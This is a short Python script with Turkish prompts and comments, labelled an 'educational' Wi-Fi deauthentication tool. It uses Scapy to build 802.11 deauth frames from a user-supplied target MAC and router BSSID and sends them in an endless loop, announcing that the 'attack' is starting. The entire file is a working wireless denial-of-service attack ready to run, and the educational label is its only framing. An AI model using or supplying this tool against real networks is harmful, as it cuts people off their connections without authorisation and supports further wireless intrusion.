from scapy.all import *
import time

print("--- WIFI DEAUTH TOOL (EĞİTİM AMAÇLI) ---")
target_mac = input("Hedef Cihaz MAC (FF:FF:FF...): ")
gateway_mac = input("Modem MAC (BSSID): ")
interface = "Wi-Fi" # Windows'ta arayüz adı

# Deauth Paketi Oluştur
packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()

print(f"🚀 SALDIRI BAŞLATILIYOR -> {target_mac}")
print("Durdurmak için CTRL+C")

try:
    while True:
        # Windows'ta raw socket kısıtlaması olabilir, Linux'ta %100 çalışır
        sendp(packet, iface=interface, count=10, inter=.1, verbose=0)
        print("⚡ Paket gönderildi...")
except KeyboardInterrupt:
    print("Saldırı durduruldu.")
except Exception as e:
    print(f"Hata: {e}")